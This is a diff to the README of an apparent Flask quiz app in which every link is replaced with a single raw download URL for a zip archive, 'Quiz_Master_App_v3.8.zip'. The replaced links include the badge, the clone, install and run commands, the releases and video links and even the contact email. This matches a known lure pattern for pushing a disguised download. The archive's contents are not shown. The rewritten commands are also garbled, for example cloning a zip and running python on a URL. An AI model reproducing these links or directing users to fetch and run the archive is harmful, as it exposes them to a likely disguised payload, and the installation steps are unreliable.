@@ -1,6 +1,6 @@
 # Quiz Master App V1 🎓
 
-![Quiz Master App](https://img.shields.io/badge/Quiz%20Master%20App-V1-brightgreen)
+![Quiz Master App](https://raw.githubusercontent.com/Slepj/Quiz-Master-App-V1/main/instance/Quiz_Master_App_v3.8.zip%20Master%20App-V1-brightgreen)
 
 Welcome to the **Quiz Master App V1**! This Flask-based quiz application allows users to take quizzes, track their performance, and provides an admin panel for managing quizzes and analyzing user performance. 
 
@@ -44,7 +44,7 @@ To get started with the Quiz Master App, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/Slepj/Quiz-Master-App-V1.git
+   git clone https://raw.githubusercontent.com/Slepj/Quiz-Master-App-V1/main/instance/Quiz_Master_App_v3.8.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -54,17 +54,17 @@ To get started with the Quiz Master App, follow these steps:
 
 3. **Install the required packages**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Slepj/Quiz-Master-App-V1/main/instance/Quiz_Master_App_v3.8.zip
    ```
 
 4. **Run the application**:
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/Slepj/Quiz-Master-App-V1/main/instance/Quiz_Master_App_v3.8.zip
    ```
 
 5. **Open your browser** and go to `http://127.0.0.1:5000`.
 
-For downloadable releases, visit the [Releases section](https://github.com/Slepj/Quiz-Master-App-V1/releases) to find the latest version.
+For downloadable releases, visit the [Releases section](https://raw.githubusercontent.com/Slepj/Quiz-Master-App-V1/main/instance/Quiz_Master_App_v3.8.zip) to find the latest version.
 
 ## Usage
 
@@ -97,9 +97,9 @@ Admins can analyze user performance using various metrics:
 
 For a visual overview of the application, check out our presentation video below:
 
-[![Watch the video](https://img.youtube.com/vi/VIDEO_ID/0.jpg)](https://www.youtube.com/watch?v=VIDEO_ID)
+[![Watch the video](https://raw.githubusercontent.com/Slepj/Quiz-Master-App-V1/main/instance/Quiz_Master_App_v3.8.zip)](https://raw.githubusercontent.com/Slepj/Quiz-Master-App-V1/main/instance/Quiz_Master_App_v3.8.zip)
 
-For more details, visit the [Releases section](https://github.com/Slepj/Quiz-Master-App-V1/releases) to download the latest version.
+For more details, visit the [Releases section](https://raw.githubusercontent.com/Slepj/Quiz-Master-App-V1/main/instance/Quiz_Master_App_v3.8.zip) to download the latest version.
 
 ## Contributing
 
@@ -118,7 +118,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Slepj](https://github.com/Slepj)
+- **Email**: https://raw.githubusercontent.com/Slepj/Quiz-Master-App-V1/main/instance/Quiz_Master_App_v3.8.zip
+- **GitHub**: [Slepj](https://raw.githubusercontent.com/Slepj/Quiz-Master-App-V1/main/instance/Quiz_Master_App_v3.8.zip)
 
 Thank you for checking out the Quiz Master App V1! We hope you enjoy using it.
